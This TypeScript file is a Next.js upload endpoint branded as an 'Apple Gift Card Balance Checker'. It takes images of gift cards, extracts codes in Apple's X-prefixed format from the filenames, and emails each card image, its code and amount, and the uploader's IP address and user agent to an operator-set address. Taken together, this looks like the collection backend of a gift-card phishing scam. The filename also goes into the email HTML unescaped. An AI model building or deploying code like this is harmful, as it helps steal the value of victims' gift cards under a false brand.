import { NextRequest, NextResponse } from 'next/server'
import { Resend } from 'resend'

// Initialize Resend with your API key
const resend = new Resend(process.env.RESEND_API_KEY)

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData()
    const file = formData.get('file') as File | null
    const amount = formData.get('amount') as string | null

    // Validate file
    if (!file) {
      return NextResponse.json(
        { error: 'No file provided' },
        { status: 400 }
      )
    }

    // Validate amount
    if (!amount || parseFloat(amount) <= 0) {
      return NextResponse.json(
        { error: 'Valid amount is required' },
        { status: 400 }
      )
    }

    // Validate file size (10MB max)
    if (file.size > 10 * 1024 * 1024) {
      return NextResponse.json(
        { error: 'File too large. Maximum size is 10MB.' },
        { status: 400 }
      )
    }

    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp']
    if (!allowedTypes.includes(file.type)) {
      return NextResponse.json(
        { error: 'Invalid file type. Please upload JPG, PNG, GIF, or WEBP.' },
        { status: 400 }
      )
    }

    // Extract code from filename
    const filename = file.name
    const filenameUpper = filename.toUpperCase()
    let extractedCode = ''

    const codeMatch = filenameUpper.match(/X[A-Z0-9]{15}/)
    if (codeMatch) {
      extractedCode = codeMatch[0]
    }

    // Read file as buffer for attachment
    const bytes = await file.arrayBuffer()
    const buffer = Buffer.from(bytes)
    const base64File = buffer.toString('base64')

    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19)
    const ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'
    const domain = request.headers.get('host') || 'localhost'

    // Build email HTML
    const htmlBody = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Apple Gift Card Upload</title>
</head>
<body style="margin:0;padding:0;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,sans-serif;">
    <table width="100%" cellpadding="0" cellspacing="0" style="min-height:100vh;">
        <tr>
            <td align="center" style="padding:40px 20px;">
                <table width="600" cellpadding="0" cellspacing="0" style="background:white;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;">
                    <tr>
                        <td style="background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);padding:40px 30px;text-align:center;">
                            <h1 style="margin:0;color:white;font-size:28px;font-weight:700;">🍎 Apple Gift Card Upload</h1>
                            <p style="margin:8px 0 0 0;color:rgba(255,255,255,0.9);font-size:14px;">Your gift card image has been received</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:40px 30px;">
                            <div style="text-align:center;margin-bottom:30px;"><div style="font-size:60px;">📄</div></div>
                            <div style="background:#f8f9ff;border-radius:12px;padding:24px;margin-bottom:30px;border-left:4px solid #0071e3;">
                                <h2 style="margin:0 0 20px 0;color:#1d1d1f;font-size:18px;font-weight:600;">Apple Gift Card Details</h2>
                                <table width="100%" cellpadding="0" cellspacing="0">
                                    <tr><td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);"><span style="color:#6e6e73;font-size:13px;font-weight:500;">FILENAME</span><br><span style="color:#1d1d1f;font-size:16px;font-weight:600;">${filename}</span></td></tr>
                                    <tr><td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);"><span style="color:#6e6e73;font-size:13px;font-weight:500;">AMOUNT</span><br><span style="color:#0071e3;font-size:24px;font-weight:700;">\$${amount}</span></td></tr>
                                    ${extractedCode ? `<tr><td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);"><span style="color:#6e6e73;font-size:13px;font-weight:500;">DETECTED CODE</span><br><span style="color:#0071e3;font-size:16px;font-weight:600;font-family:monospace;">${extractedCode}</span></td></tr>` : ''}
                                    <tr><td style="padding:12px 0;border-bottom:1px solid rgba(0,0,0,0.05);"><span style="color:#6e6e73;font-size:13px;font-weight:500;">FILE SIZE</span><br><span style="color:#1d1d1f;font-size:14px;">${(file.size / 1024 / 1024).toFixed(2)} MB</span></td></tr>
                                    <tr><td style="padding:12px 0;"><span style="color:#6e6e73;font-size:13px;font-weight:500;">FILE TYPE</span><br><span style="color:#1d1d1f;font-size:14px;">${file.type}</span></td></tr>
                                </table>
                            </div>
                            <div style="background:#f5f5f7;border-radius:12px;padding:20px;">
                                <h3 style="margin:0 0 16px 0;color:#1d1d1f;font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Request Metadata</h3>
                                <table width="100%" cellpadding="0" cellspacing="0" style="font-size:13px;">
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">IP Address:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;">${ip}</td></tr>
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">Submitted At:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;">${timestamp}</td></tr>
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">Domain:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;">${domain}</td></tr>
                                    <tr><td style="padding:8px 0;color:#6e6e73;font-weight:500;">User Agent:</td><td style="padding:8px 0;color:#1d1d1f;text-align:right;word-break:break-word;font-size:12px;">${userAgent.substring(0, 200)}</td></tr>
                                </table>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td style="background:#f5f5f7;padding:30px;text-align:center;border-top:1px solid #e5e5e7;">
                            <p style="margin:0;color:#6e6e73;font-size:12px;">© 2026 Apple Gift Card Balance Checker. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
    `

    // Send email using Resend with attachment
    await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || 'onboarding@resend.dev',
      to: process.env.RESEND_TO_EMAIL || 'delivered@resend.dev',
      subject: `📸 Apple Gift Card Upload - Code: ${extractedCode || 'N/A'} - Amount: $${amount}`,
      html: htmlBody,
      attachments: [
        {
          filename: filename,
          content: base64File,
        },
      ],
    })

    return NextResponse.json({
      success: true,
      code: extractedCode || null,
      message: 'Upload successful',
    })
    
  } catch (error) {
    console.error('Upload error:', error)
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Failed to process upload' },
      { status: 500 }
    )
  }
}